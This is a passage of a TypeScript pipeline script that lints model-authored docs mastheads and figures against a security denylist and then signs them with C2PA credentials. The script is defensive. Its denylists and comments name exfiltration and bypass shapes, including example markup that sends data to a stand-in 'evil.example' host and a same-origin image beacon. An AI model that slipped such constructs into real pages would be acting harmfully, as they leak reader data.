// SPDX-License-Identifier: MPL-2.0
/**
 * sign-docs-art — the bank-time pipeline for `docs/mastheads/` and `docs/figures/`
 * (plan 105 §6): LINT every artifact, then sign the ones whose bytes changed.
 *
 * WHY a gate exists at all. These artifacts are small programs, mostly written by
 * models, that `docs/build.ts` INLINES into a docs page — so they run in the page's
 * own origin with the page's own privileges. Bank time is the only moment where
 * trust can be established once for many readers, so the lint runs here rather than
 * at build time: an artifact that fails is not published, not "published with a
 * warning". The CSP (`default-src 'self'`) is the runtime backstop against exfil,
 * but storage, dynamic code and same-origin beacons are not CSP-gated — the lint is
 * that line. It is a REVIEW AID, not a sandbox: human curation stays the final
 * filter (plan §10), and a denylist can always be out-thought by someone who is
 * trying. What it guarantees is that nothing gets in by accident, and that anything
 * deliberate has to look deliberate in the diff.
 *
 * WHY the credential. An artifact ships as its own file at `/info/mastheads/<id>.svg`,
 * and the docs page's credential line points a reader at those exact bytes ("Check it
 * yourself" / "Copy signed source"). The claim states three separable facts, and the
 * honesty rule is that it must never over-claim in EITHER direction:
 *
 *   claim_generator_info  — who made the CLAIM. Always Lolly (§10.2.3.2 defines this
 *                           field as the actor that generated the claim, which is this
 *                           script, not the model that drew the art).
 *   c2pa.created          — digitalSourceType from the meta's `source`: the nature of
 *                           the asset at its inception (§18.15.2 requires one), and the
 *                           authoring tool as the step's free-text description
 *                           (§18.15.4.1) since the softwareAgent of every step is Lolly.
 *   c2pa.ai-disclosure    — §18.28: the model, its identifier, and the human-oversight
 *                           level. §18.28.3 is explicit that with `digitalCreation`
 *                           ("no trained model invoked") the disclosure is NOT attached,
 *                           so a meta pairing digitalCreation with a model is refused as
 *                           contradictory rather than resolved by guessing.
 *
 * Provenance is not optional: an artifact with no `<id>.meta.json` is refused. There is
 * no default source type — a default here would be the script inventing history.
 *
 * SIGN ONLY WHAT CHANGED. Every signing run mints a fresh ephemeral key and a fresh
 * timestamp, so re-signing unchanged bytes would churn the committed bank on every
 * run (the shots-pipeline lesson). An artifact is skipped when its existing store
 * still HARD-BINDS to its current bytes — the binding, not the whole verdict, so an
 * expired or untrusted certificate (the designed posture for an on-device key) never
 * causes churn. Pass --force to re-sign regardless.
 *
 * Usage:
 *   node scripts/sign-docs-art.ts              # lint + sign what changed
 *   node scripts/sign-docs-art.ts --check      # lint + report, write nothing (CI)
 *   node scripts/sign-docs-art.ts --force      # re-sign everything that lints clean
 *
 * Exit code 1 on any lint/meta violation, and NOTHING is signed in that run — a bank
 * with one bad artifact is a bank under review, not a bank with one file missing.
 */

import { readFileSync, writeFileSync, existsSync, readdirSync } from 'node:fs';
import { join, resolve, dirname, basename } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { embedC2pa, stripPlacedArmorLine, C2PA_FRAGMENT_PROFILE } from '../engine/src/c2pa-containers.ts';
import { extractC2paStore } from '../engine/src/c2pa-extract.ts';
import { verifyC2pa } from '../engine/src/c2pa-verify.ts';
import { C2PA_CHECK } from '../engine/src/c2pa-verdict.ts';
import {
  C2PA_SPEC_VERSION, HUMAN_OVERSIGHT_LEVELS,
  DIGITAL_SOURCE_TYPE, GENERATED_SOURCE_TYPE, COMPOSITE_SOURCE_TYPE,
} from '../engine/src/c2pa.ts';
import { buildExportC2paOpts, type ExportC2paOpts } from '../packages/node-shell/src/c2pa-opts.ts';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');

// ── The bank ──────────────────────────────────────────────────────────────────

export type ArtKind = 'masthead' | 'figure';

/**
 * Source budgets, PRE-manifest (plan §6): a masthead is a small component the page
 * inlines before its own content paints; a figure carries real data inline and gets
 * the larger allowance. Measured on the artifact with any existing manifest stripped,
 * so a signed file never eats its own budget.
 */
export const ART_BUDGETS: Record<ArtKind, number> = { masthead: 48 * 1024, figure: 128 * 1024 };

/** Credential window. Long, because a banked artifact is signed once and served for
 *  years: a shorter one would make every reader after month 13 see "expired" on a file
 *  that never changed. The window is not a trust signal here anyway — the key is
 *  ephemeral and self-signed, which every verifier reports as untrusted by design. */
export const ART_CREDENTIAL_DAYS = 3650;

export interface ArtBank { kind: ArtKind; dir: string; budget: number }

export function artBanks(docsDir: string): ArtBank[] {
  return [
    { kind: 'masthead', dir: join(docsDir, 'mastheads'), budget: ART_BUDGETS.masthead },
    { kind: 'figure', dir: join(docsDir, 'figures'), budget: ART_BUDGETS.figure },
  ];
}

/** `.svg` → the §A.3.3 SVG embedding; `.html` → the Lolly fragment profile (§A.9
 *  armour in an HTML comment — OUR profile, spec-adjacent, labelled as such). */
export const ART_FORMATS: Record<string, string> = { '.svg': 'svg', '.html': C2PA_FRAGMENT_PROFILE.format };

// ── meta.json ─────────────────────────────────────────────────────────────────

export interface ArtMeta {
  generator: { name: string; version?: string };
  model?: { name: string; identifier?: string };
  oversight?: (typeof HUMAN_OVERSIGHT_LEVELS)[number];
  source: 'trainedAlgorithmicMedia' | 'digitalCreation' | 'compositeWithTrainedAlgorithmicMedia';
  locale?: string;
}

/**
 * §18.28.3's own table, transcribed. `digitalCreation` is the row that reads "No
 * trained model invoked; AI Model Disclosure assertion is not attached" — which is
 * why the meta validator refuses a model/oversight beside it instead of silently
 * dropping either the disclosure (under-claiming) or the source (over-claiming).
 */
export const ART_SOURCE_TYPES: Record<ArtMeta['source'], string> = {
  trainedAlgorithmicMedia: GENERATED_SOURCE_TYPE,
  digitalCreation: DIGITAL_SOURCE_TYPE,
  compositeWithTrainedAlgorithmicMedia: COMPOSITE_SOURCE_TYPE,
};

const BCP47 = /^[A-Za-z]{2,3}(-[A-Za-z0-9]{2,8})*$/;
const META_KEYS = new Set(['generator', 'model', 'oversight', 'source', 'locale']);

const isObj = (v: unknown): v is Record<string, unknown> => !!v && typeof v === 'object' && !Array.isArray(v);
const isStr = (v: unknown): v is string => typeof v === 'string' && v.trim().length > 0;

/**
 * Validate a parsed meta.json STRICTLY, including unknown keys: these files are
 * hand-authored beside the art, and a typo'd `overisght` that was quietly ignored
 * would ship a credential that says less than its author believed it said.
 */
export function validateArtMeta(raw: unknown): { meta: ArtMeta } | { problems: string[] } {
  const problems: string[] = [];
  if (!isObj(raw)) return { problems: ['meta.json must be a JSON object'] };

  for (const k of Object.keys(raw)) {
    if (!META_KEYS.has(k)) problems.push(`unknown key "${k}" — allowed: ${[...META_KEYS].join(', ')}`);
  }
  const gen = raw.generator;
  if (!isObj(gen) || !isStr(gen.name)) problems.push('generator.name is required (the tool that authored the artifact)');
  else if (gen.version !== undefined && !isStr(gen.version)) problems.push('generator.version must be a non-empty string when present');

  const src = raw.source;
  if (!isStr(src) || !(src in ART_SOURCE_TYPES)) {
    problems.push(`source is required and must be one of ${Object.keys(ART_SOURCE_TYPES).join(' / ')} (IPTC digitalSourceType, §18.15.4.5)`);
  }
  const model = raw.model;
  if (model !== undefined) {
    if (!isObj(model) || !isStr(model.name)) problems.push('model.name is required when model is present');
    else if (model.identifier !== undefined && !isStr(model.identifier)) problems.push('model.identifier must be a non-empty string when present');
  }
  const oversight = raw.oversight;
  if (oversight !== undefined && !(HUMAN_OVERSIGHT_LEVELS as readonly string[]).includes(oversight as string)) {
    problems.push(`oversight must be one of ${HUMAN_OVERSIGHT_LEVELS.join(' / ')} (§18.28.4)`);
  }
  if (raw.locale !== undefined && (!isStr(raw.locale) || !BCP47.test(raw.locale))) {
    problems.push('locale must be a BCP-47 tag, e.g. "de" or "pt-BR"');
  }
  // §18.28.3: digitalCreation means no trained model was invoked, and the disclosure
  // is not attached. Naming a model beside it is a contradiction only the author can
  // resolve — either the artifact came out of a model (say so in `source`) or it did
  // not (drop the model). Guessing would falsify one half of the record.
  if (src === 'digitalCreation') {
    if (model !== undefined) problems.push('source "digitalCreation" declares that no trained model was invoked (§18.28.3) — remove `model`, or set source to trainedAlgorithmicMedia / compositeWithTrainedAlgorithmicMedia');
    if (oversight !== undefined) problems.push('source "digitalCreation" has no human-oversight level to declare (§18.28.3 reads "not applicable") — remove `oversight`');
  }
  return problems.length ? { problems } : { meta: raw as unknown as ArtMeta };
}

// ── Stripping an existing manifest ────────────────────────────────────────────

const SVG_XMLNS_C2PA = /\s+xmlns:c2pa="http:\/\/c2pa\.org\/manifest"/;
/** placeSvg's carrier, and ONLY its shape: the element's content is one
 *  unbroken base64 run (the alphabet has no `<`), so anything else between those
 *  tags is not a credential and must not be cut out of the linter's view. */
const SVG_MANIFEST_EL = /<c2pa:manifest\b[^>]*>[A-Za-z0-9+/=\s]*<\/c2pa:manifest>/;

/**
 * The artifact WITHOUT its credential — what the lint reads and what the budget
 * measures. Exact inverse of the placers for the two shapes this bank holds, so
 * `strip(sign(x)) === x` (pinned by test): a signed artifact must lint and measure
 * identically to the source it was made from, or the budget would shrink by ~10 KB
 * the moment a file was first signed and the lint would scan a base64 blob for
 * source tokens.
 *
 * THE STRIP IS A HOLE IN THE LINT, so it is cut as narrowly as the placers cut.
 * Everything removed here is text no rule will ever see, and the earlier patterns
 * were loose in exactly the way that matters: the armour regex was line-anchored
 * at the start but LAZY ACROSS LINES to the first `-----END`, so a file could open
 * a fake armour block and hide arbitrary source — an off-origin beacon, a
 * `document.cookie` read, 200 KB of budget — between it and any later END. `--check`
 * (the CI gate) then reported zero violations and left the file hostile; a real
 * signing run happened to destroy the payload only because it re-writes the file
 * from the stripped source, which is luck, not a control.
 *
 * The same looseness deleted honest content: a figure that DOCUMENTS the armour
 * format — on a docs site whose subject is C2PA — lost the paragraph between its
 * example line and the next END, silently, at sign time.
 *
 * So: one line, at the end, with comment syntax and a real reference (the engine's
 * own {@link stripPlacedArmorLine}, which is the placer's inverse and its owner),
 * or nothing is removed and {@link lintArtSource}'s `manifest` rule refuses the
 * artifact with the delimiters still in plain view.
 */
export function stripArtManifest(text: string, format: string): string {
  if (format === 'svg') {
    let out = text.replace(SVG_MANIFEST_EL, '');
    // placeSvg synthesises `<metadata>…</metadata>` immediately after the root open
    // tag when the file has none; anywhere else the <metadata> is the artifact's own.
    out = out.replace(/(<svg\b[^>]*>)<metadata><\/metadata>/, '$1');
    return out.replace(SVG_XMLNS_C2PA, '');
  }
  return stripPlacedArmorLine(text);
}

// ── Lint ──────────────────────────────────────────────────────────────────────

export interface Violation { file: string; rule: string; line: number | null; message: string }

/**
 * Identifier denylist. Each token is matched on a word boundary in the artifact's
 * WHOLE text — comments included, deliberately: a comment-aware scanner is another
 * parser to fool, and "this artifact must not contain the word fetch" is a rule an
 * author can satisfy by rephrasing, while "this artifact must not fetch" is a rule
 * only a sandbox can enforce.
 */
const DENIED_IDENTIFIERS: { token: string; rule: string; why: string }[] = [
  // Network — the exfiltration surface the CSP narrows but does not close (a
  // same-origin POST is allowed by `default-src 'self'`).
  ...['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'sendBeacon', 'importScripts',
    'RTCPeerConnection', 'RTCDataChannel', 'navigator'].map((token) => ({ token, rule: 'network', why: 'artifacts are self-contained; nothing in the bank talks to the network' })),
  // Background execution contexts — each is a second scope the reviewer would have
  // to reason about separately, and none is needed to draw.
  ...['Worker', 'SharedWorker', 'serviceWorker', 'BroadcastChannel', 'postMessage'].map((token) => ({ token, rule: 'isolation', why: 'no second execution context or cross-frame channel' })),
  // Storage — NOT CSP-gated. This is why the lint exists as well as the CSP.
  ...['localStorage', 'sessionStorage', 'indexedDB', 'openDatabase', 'caches', 'cookie'].map((token) => ({ token, rule: 'storage', why: 'art keeps no state on the reader\'s device' })),
  // Dynamic code — an artifact that builds code at runtime cannot be reviewed by
  // reading it, which makes every other rule here unenforceable.
  ...['eval', 'Function', 'atob', 'unescape', 'execScript', 'require'].map((token) => ({ token, rule: 'dynamic-code', why: 'the artifact must be reviewable by reading it' })),
  // Device + user surfaces that a decorative or illustrative component never needs,
  // and that would be a permission prompt appearing out of a docs page.
  ...['getUserMedia', 'geolocation', 'Notification', 'clipboard', 'requestFullscreen', 'showModal'].map((token) => ({ token, rule: 'device', why: 'no device access, permission prompt or viewport takeover from a docs page' })),
  ...['opener', 'domain'].map((token) => ({ token, rule: 'isolation', why: 'no reach outside the artifact' })),
  // Aliases of the global object. The bracket-indexed-global pattern below names
  // the globals themselves, which is no help against `var w = document.defaultView`
  // — one property read hands you `window` under a name no denylist can predict.
  // Deny the doors instead of trying to track what comes through them.
  ...['defaultView', 'contentWindow', 'contentDocument'].map((token) => ({ token, rule: 'dynamic-code', why: 'a second window/document reference — name what you touch directly' })),
];

const DENIED_PATTERNS: { rule: string; re: RegExp; message: string }[] = [
  { rule: 'dynamic-code', re: /\bimport\s*[(.]/, message: 'dynamic `import()` / `import.meta`' },
  // Static ESM is a network load too — `<script type="module">import … from '/x.mjs'`
  // puts the artifact's behaviour in a file the reviewer never opens, which is the
  // same defeat of "reviewable by reading it" as a dynamic import. Anchored on a
  // quote so the English word "import" in a comment is not a refusal.
  { rule: 'dynamic-code', re: /\bimport\s*['"]|\bimport\s+[A-Za-z_$*{][^\n;]*\bfrom\s*['"]/, message: 'static ESM `import … from` — an artifact is one file' },
  { rule: 'dynamic-code', re: /\.\s*constructor\b|\[\s*['"]constructor['"]\s*\]/, message: '`.constructor` — the standard route back to Function()' },
  { rule: 'dynamic-code', re: /\bset(?:Timeout|Interval)\s*\(\s*['"`]/, message: 'setTimeout/setInterval with a string body (eval by another name)' },
  { rule: 'dynamic-code', re: /javascript\s*:/i, message: '`javascript:` URI' },
  { rule: 'dynamic-code', re: /(?:window|self|globalThis|document|top|parent|frames)\s*\[/, message: 'bracket-indexed global — the shape a denylist bypass takes; name the property directly' },
  { rule: 'embedding', re: /<\s*(?:iframe|object|embed|frame|frameset|portal)\b/i, message: 'nested browsing context (iframe/object/embed/frame/portal)' },
  { rule: 'embedding', re: /\bsrcdoc\s*=/i, message: '`srcdoc` — an inline document with its own script scope' },
  // `<meta http-equiv="refresh" content="5;url=…">` navigates the reader's page
  // with no script at all, and browsers honour it in <body> — which is where an
  // inlined fragment lands. The `isolation` rules below name three scripted ways
  // to do this; this is the fourth, and the only one that needs no JS.
  { rule: 'isolation', re: /<\s*meta\b[^>]*http-equiv\s*=\s*["']?\s*refresh/i, message: '`<meta http-equiv="refresh">` — the artwork navigating the page it sits on' },
  // Markup and CSS assembled at runtime. Not a style question: every reference
  // rule below reads the artifact's TEXT, so a URL that only exists after a
  // string concatenation is a reference no rule can see. `textContent` is
  // deliberately NOT here (an artifact that writes a number into a label is
  // ordinary); the element that would carry the injected CSS is caught instead.
  { rule: 'dynamic-code', re: /\b(?:innerHTML|outerHTML|insertAdjacentHTML|cssText|insertRule)\b|\bdocument\s*\.\s*write(?:ln)?\s*\(/, message: 'markup or CSS built at runtime — the artifact must be reviewable by reading it' },
  { rule: 'dynamic-code', re: /createElement(?:NS)?\s*\([^)]*['"](?:style|script|link|meta|base|iframe|object|embed)['"]/i, message: 'creating a stylesheet/script/link element at runtime — same reason' },
  { rule: 'xml', re: /<!ENTITY\b/i, message: 'XML entity declaration (entity expansion / external entity)' },
  { rule: 'external-resource', re: /@import\b/i, message: 'CSS `@import` — an artifact carries its own styles' },
  // The runtime twins of the reference-attribute rules below. `new Image().src = …`
  // is a GET with a query string — a same-origin beacon the CSP happily allows, and
  // the one exfil shape that survives every rule above. Nothing an artifact does
  // needs to point a subresource somewhere after it has loaded.
  { rule: 'external-resource', re: /\.\s*(?:src|srcset|href)\s*=(?!=)/, message: 'assigning a subresource URL at runtime — an artifact loads nothing after it is placed' },
  { rule: 'external-resource', re: /setAttribute(?:NS)?\s*\(\s*[^)]*['"](?:xlink:)?(?:src|href|data|action|srcset)['"]/i, message: 'setting a URL attribute at runtime — same reason' },
  // Navigation is not exfiltration, but a decorative band that moves the reader's
  // page is the same class of surprise, and neither shape occurs in prose.
  { rule: 'isolation', re: /\blocation\s*(?:\.\s*(?:href|assign|replace)|=(?!=))/, message: 'navigating the page from inside the artwork' },
  { rule: 'isolation', re: /\bhistory\s*\.\s*(?:pushState|replaceState)\b/, message: 'rewriting the reader\'s history from inside the artwork' },
  { rule: 'isolation', re: /\bwindow\s*\.\s*open\s*\(/, message: '`window.open` — an artifact opens nothing' },
];

/** Schemes that mean "off this document". `data:` is handled separately (an inlined
 *  image is self-contained; an inlined document is a script scope). */
const EXTERNAL_SCHEME = /\b(?:https?|ftp|ws|wss|file|blob|about|chrome-extension|moz-extension):/i;
/** The one place an absolute URL is not a reference: XML namespaces are identifiers,
 *  never fetched. Blanked (length-preserving) before the URL scan so line numbers hold. */
const XMLNS_DECL = /xmlns(?::[A-Za-z0-9_.-]+)?\s*=\s*("[^"]*"|'[^']*')/g;
const DOCTYPE = /<!DOCTYPE[^>]*>/gi;
const XML_PROLOG = /<\?xml[^>]*\?>/gi;

/**
 * Attributes whose value is a reference — with HTML's real attribute grammar,
 * including UNQUOTED values.
 *
 * The quoted-only version of this rule was the single largest hole in the gate:
 * `<base href=//evil.example/>` (which re-points every relative URL on the whole
 * docs page, not just the artifact's), `<img src=//evil.example/b?d=leak>`,
 * `<form action=//evil.example/c>`, `<a ping=…>` and `<image xlink:href=…>` all
 * signed clean, while the identical constructs WITH quotes were correctly
 * refused. The protocol-relative backstop missed them for the same reason: an
 * unquoted value puts `=` immediately before the `//`, not a quote.
 *
 * The unquoted branch is the engine reader's own grammar
 * (`htmlAttrValues` in c2pa-containers.ts), written against the same spec.
 */
const REF_ATTRS = /(?:^|[\s/])(xlink:href|href|src|srcset|data|poster|action|formaction|ping|background|cite)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))/gi;
/** Elements for which a root-relative `href` really is navigation. Everything
 *  else that spells `href` — `<link>`, SVG2 `<script href>`, `<use>`, `<image>` —
 *  is a SUBRESOURCE LOAD, and the old blanket exemption waved all of them
 *  through: `<script href="/evil.js">` signed while `<script xlink:href="/evil.js">`
 *  was refused, one load with two spellings and two verdicts. */
const HREF_IS_NAVIGATION = new Set(['a', 'area']);

/** The element an attribute match belongs to — the tag name of the nearest `<`
 *  at or before it. Cheap and text-local, which is all the reference rules need:
 *  they are deciding "is this href navigation or a load", not parsing a DOM. */
function ownerTag(text: string, at: number): string {
  const lt = text.lastIndexOf('<', at);
  if (lt < 0) return '';
  return (/^<\/?\s*([A-Za-z][A-Za-z0-9:._-]*)/.exec(text.slice(lt, lt + 48))?.[1] ?? '').toLowerCase();
}
const DATA_OK = /^data:(?:image\/(?:png|jpeg|gif|webp|svg\+xml)|font\/[a-z0-9+-]+|application\/font-[a-z0-9+-]+);/i;
/** `url(#local)` is an SVG paint reference; anything else is a resource. */
const CSS_URL = /url\(\s*(['"]?)([^'")]*)\1\s*\)/gi;

const MOTION_JS = /\brequestAnimationFrame\s*\(|\.\s*animate\s*\(/;
const MOTION_CSS = /@keyframes\b|\banimation(?:-name)?\s*:/i;
const REDUCED_MOTION = /prefers-reduced-motion/;
/** The guard the plan's motion contract names: motion behind `no-preference`. */
const CSS_MOTION_NO_PREF = /@media[^{]*\bprefers-reduced-motion\s*:\s*no-preference[^{]*\{/i;
/** …and the equally honest inverse: a `reduce` block that turns motion off. */
const CSS_MOTION_OFF = /\banimation(?:-name)?\s*:\s*(?:none|unset|initial|revert)\b|\banimation-play-state\s*:\s*paused\b|\btransition\s*:\s*none\b/i;
/**
 * Does this CSS DECLARE motion (as opposed to switching it off)? Read as
 * declarations rather than as one regex: a negative lookahead after `\s*` can
 * simply backtrack over the whitespace and match anyway, so `animation: none`
 * would read as "declares motion" — a false refusal, and false refusals are how
 * a trust gate gets worked around.
 */
function declaresMotion(css: string): boolean {
  if (/@keyframes\b/i.test(css)) return true;
  for (const m of css.matchAll(/\banimation(?:-name|-play-state)?\s*:\s*([^;}]*)/gi)) {
    const value = (m[1] ?? '').trim().toLowerCase();
    if (value && !/^(?:none|unset|initial|revert|inherit|paused)\b/.test(value)) return true;
  }
  return false;
}

/**
 * Every `@media (prefers-reduced-motion: reduce)` block's body, brace-balanced
 * (nested `@keyframes`/`@supports` included, which is why this counts rather
 * than regexes).
 */
function reduceMotionBlocks(text: string): string[] {
  const out: string[] = [];
  for (const m of text.matchAll(/@media[^{]*\bprefers-reduced-motion\s*:\s*reduce[^{]*\{/gi)) {
    let depth = 1;
    let i = m.index + m[0].length;
    const from = i;
    for (; i < text.length && depth > 0; i++) {
      if (text[i] === '{') depth++;
      else if (text[i] === '}') depth--;
    }
    out.push(text.slice(from, i - (depth === 0 ? 1 : 0)));
  }
  return out;
}

/**
 * The source with COMMENTS BLANKED, length-preserving so line numbers still hold.
 * Used only by the motion contract — see the rule for why a guard has to be code.
 * `//` is treated as a comment only when it does not follow a `:`, so the `http://`
 * in an `xmlns` declaration does not swallow the rest of its line.
 */
export function blankComments(text: string): string {
  const blank = (s: string): string => s.replace(/[^\n]/g, ' ');
  return text
    .replace(/\/\*[\s\S]*?\*\//g, blank)
    .replace(/<!--[\s\S]*?-->/g, blank)
    .replace(/(^|[^:\\])\/\/[^\n]*/g, (m, pre: string) => pre + blank(m.slice(pre.length)));
}
/** How far a reduced-motion mention may sit from a motion site and still count as
 *  "next to" it (the brief's word). Wide enough for `const reduce = matchMedia(…)`
 *  hoisted to the top of a small module, narrow enough that the guard is visible in
 *  the same screenful as the loop it governs. */
export const MOTION_GUARD_WINDOW = 40;
const SELF_SUSPEND = /visibilitychange|document\.hidden|IntersectionObserver/;

const lineOf = (text: string, index: number): number => text.slice(0, index).split('\n').length;

/** Two rounds, because `&amp;#102;` is one decode away from `&#102;`. */
function decodeEntities(s: string): string {
  const once = (t: string): string => t
    .replace(/&#x([0-9a-f]+);/gi, (_m, h: string) => String.fromCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);/g, (_m, d: string) => String.fromCodePoint(Number(d)))
    .replace(/&(amp|lt|gt|quot|apos|nbsp);/gi, (_m, n: string) =>
      ({ amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ' })[n.toLowerCase()] ?? _m);
  return once(once(s));
}

function decodeJsEscapes(s: string): string {
  return s
    .replace(/\\u\{([0-9a-f]+)\}/gi, (_m, h: string) => String.fromCodePoint(parseInt(h, 16)))
    .replace(/\\u([0-9a-f]{4})/gi, (_m, h: string) => String.fromCharCode(parseInt(h, 16)))
    .replace(/\\x([0-9a-f]{2})/gi, (_m, h: string) => String.fromCharCode(parseInt(h, 16)));
}

/** `'fe' + 'tch'` — the other half of the obfuscation pair. */
const joinConcats = (s: string): string => s.replace(/['"]\s*\+\s*['"]/g, '');

/** `String.fromCharCode(102, 101, 116, 99, 104)` → `fetch`. The literal-argument
 *  form only: a computed one cannot be decoded here by anything short of an
 *  interpreter, which is what the module header says this gate is not. Decoding
 *  beats denying — building a string from char codes is a legitimate (if rare)
 *  thing for a drawing to do; reaching `fetch` that way is not. */
const decodeCharCodes = (s: string): string =>
  s.replace(/\bString\s*\.\s*fromCharCode\s*\(([\s\d,]+)\)|\bString\s*\.\s*fromCodePoint\s*\(([\s\d,]+)\)/g,
    (_m, a: string | undefined, b: string | undefined) => {
      const nums = (a ?? b ?? '').split(',').map((x) => Number(x.trim()));
      return nums.every((n) => Number.isInteger(n) && n >= 0 && n <= 0x10ffff)
        ? String.fromCodePoint(...nums)
        : _m;
    });

/**
 * The normalized view the rules ALSO run against. Entities, JS escapes, string
 * concatenation and char-code construction are the four ways a denied token or a
 * URL hides in plain sight; decoding them costs one extra scan and closes the
 * obvious evasions. It does not close clever ones — see the module header on what
 * this gate is and is not.
 */
export function normalizeForLint(text: string): string {
  return decodeCharCodes(joinConcats(decodeJsEscapes(decodeEntities(text))));
}

/**
 * Open tags of one element name, scanned QUOTE-AWARE (placeSvg's own discipline).
 * A plain `<svg[^>]*>` stops at the first `>` even inside an attribute value, so a
 * figure whose label reads "a > b" would be reported as having no viewBox — a false
 * refusal in a trust gate is how a trust gate gets worked around.
 */
function* openTags(text: string, name: string): Generator<{ src: string; index: number }> {
  for (const m of text.matchAll(new RegExp(`<${name}(?=[\\s>/])`, 'gi'))) {
    let q: string | null = null;
    let i = m.index + name.length + 1;
    for (; i < text.length; i++) {
      const ch = text[i]!;
      if (q) { if (ch === q) q = null; }
      else if (ch === '"' || ch === "'") q = ch;
      else if (ch === '>') break;
    }
    yield { src: text.slice(m.index, Math.min(i + 1, text.length)), index: m.index };
  }
}

export interface LintContext { file: string; kind: ArtKind; format: string; budget: number }

/**
 * Lint one artifact's SOURCE (manifest already stripped). Returns every violation —
 * never the first — because a bank entry is reviewed once, and a gate that reports
 * one problem per run turns curation into a guessing game.
 */
export function lintArtSource(text: string, ctx: LintContext): Violation[] {
  const out: Violation[] = [];
  const seen = new Set<string>();
  const add = (rule: string, line: number | null, message: string): void => {
    const key = `${rule}|${message}|${line ?? ''}`;
    if (seen.has(key)) return;
    seen.add(key);
    out.push({ file: ctx.file, rule, line, message });
  };

  // ── budget (source bytes, pre-manifest)
  const bytes = Buffer.byteLength(text, 'utf8');
  if (bytes > ctx.budget) {
    add('budget', null, `${Math.round(bytes / 1024)} KB of source — the ${ctx.kind} budget is ${Math.round(ctx.budget / 1024)} KB (pre-manifest)`);
  }
  if (!text.trim()) add('empty', null, 'the artifact is empty');
  // Everything below 0x20 except tab/newline/carriage-return, plus DEL. A banked
  // artifact is text a human read; an invisible byte is the opposite of that.
  const ctl = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/.exec(text);
  if (ctl) add('binary', lineOf(text, ctl.index), 'control characters in the source — a banked artifact is reviewable text');
  // ── shape
  if (ctx.format === 'svg') {
    if (!/<svg\b/i.test(text)) add('shape', null, 'not an SVG (no <svg> element)');
  } else if (/<\s*(?:html|head|body)\b/i.test(text) || /<!DOCTYPE\s+html/i.test(text)) {
    add('shape', null, 'the bank holds HTML FRAGMENTS (markup + script, no document shell) — a whole document cannot be inlined into a page');
  }
  // Every <svg> needs a viewBox, in both formats: without one the artwork cannot
  // scale to the band/figure box it is inlined into, and the docs build reads the
  // viewBox to reserve space before paint.
  for (const tag of openTags(text, 'svg')) {
    if (!/\bviewBox\s*=/.test(tag.src)) add('viewbox', lineOf(text, tag.index), '<svg> without a viewBox');
  }

  // ── denylist, over the raw text and its normalized twin
  const views: { text: string; normalized: boolean }[] = [{ text, normalized: false }];
  const norm = normalizeForLint(text);
  if (norm !== text) views.push({ text: norm, normalized: true });

  for (const view of views) {
    const where = (i: number): number | null => (view.normalized ? null : lineOf(view.text, i));
    const note = view.normalized ? ' (after decoding entities / escapes / concatenation)' : '';
    for (const { token, rule, why } of DENIED_IDENTIFIERS) {
      const m = new RegExp(`\\b${token}\\b`).exec(view.text);
      if (m) add(rule, where(m.index), `\`${token}\`${note} — ${why}`);
    }
    for (const { rule, re, message } of DENIED_PATTERNS) {
      const m = re.exec(view.text);
      if (m) add(rule, where(m.index), `${message}${note}`);
    }

    // External URLs. Namespace declarations, the XML prolog and the DOCTYPE are
    // blanked length-preservingly first: they carry w3.org URIs that are identifiers,
    // not references, and are the one legitimate absolute URL in an artifact.
    const blank = (s: string, re: RegExp): string => s.replace(re, (mm) => ' '.repeat(mm.length));
    const scanned = blank(blank(blank(view.text, XMLNS_DECL), DOCTYPE), XML_PROLOG);
    const url = EXTERNAL_SCHEME.exec(scanned);
    if (url) add('external-url', where(url.index), `external URL (${url[0]}…)${note} — an artifact reaches nothing off its own page`);
    const rel = /(["'(])\/\/[A-Za-z0-9]/.exec(scanned);
    if (rel) add('external-url', where(rel.index), `protocol-relative URL${note} — an artifact reaches nothing off its own page`);

    // ── references must be same-document (or an inlined image/font)
    //
    // Inside the view loop, deliberately. These rules used to read the RAW text
    // only while the denylists read both views, and that asymmetry WAS the bypass
    // class: `&#47;&#47;evil.example` and `'ur' + 'l(/beacon?d='` are references
    // written in a dialect the reference rules did not read, so every one of them
    // signed clean. Same rules, same two views, no dialects left.
    for (const m of view.text.matchAll(REF_ATTRS)) {
      const attr = m[1]!.toLowerCase();
      const value = (m[2] ?? m[3] ?? m[4] ?? '').trim();
      if (!value || value.startsWith('#') || DATA_OK.test(value)) continue;
      // Root-relative `href` is same-origin NAVIGATION — but only on the elements
      // where href means navigation. On `<link>`, on SVG2 `<script href>`, on
      // `<use>`/`<image>`, the same attribute is a subresource load.
      const owner = ownerTag(view.text, m.index);
      if (attr === 'href' && HREF_IS_NAVIGATION.has(owner) && value.startsWith('/') && !value.startsWith('//')) continue;
      add('external-resource', where(m.index), `<${owner || '?'}> ${attr}="${value.slice(0, 60)}"${note} — an artifact is one self-contained file (same-document \`#…\`, an inlined data: image/font, or a root-relative href on a link you can click)`);
    }
    for (const tag of openTags(view.text, 'use')) {
      const value = (/(?:xlink:)?href\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))/i.exec(tag.src)?.slice(1).find((x) => x !== undefined) ?? '').trim();
      if (!value.startsWith('#')) add('external-resource', where(tag.index), `<use> pointing outside the document (${value.slice(0, 60)})${note}`);
    }
    for (const m of view.text.matchAll(CSS_URL)) {
      const value = (m[2] ?? '').trim();
      if (!value || value.startsWith('#') || DATA_OK.test(value)) continue;
      add('external-resource', where(m.index), `url(${value.slice(0, 60)})${note} — an artifact carries its own paint`);
    }
  }

  // ── the strip's leftovers (see stripArtManifest)
  //
  // The strip only removes a credential exactly where a placer writes one, so
  // whatever delimiters are still here are either a carrier in a shape we do not
  // write or a fake armour block wrapped around something the author would rather
  // the lint did not read. Both are refusals: `--check` must not be able to pass a
  // file that a real signing run would silently rewrite.
  const leftover = /-----(?:BEGIN|END) C2PA MANIFEST-----|<c2pa:manifest\b|type\s*=\s*["']?application\/c2pa/i.exec(text);
  if (leftover) {
    add('manifest', lineOf(text, leftover.index), `C2PA manifest markup (${leftover[0]}) the bank's own strip does not recognise — a banked artifact carries its credential where the placer puts it, and text hidden behind a manifest carrier is text the lint cannot read`);
  }

  // ── motion contract (plan §6 step 2)
  //
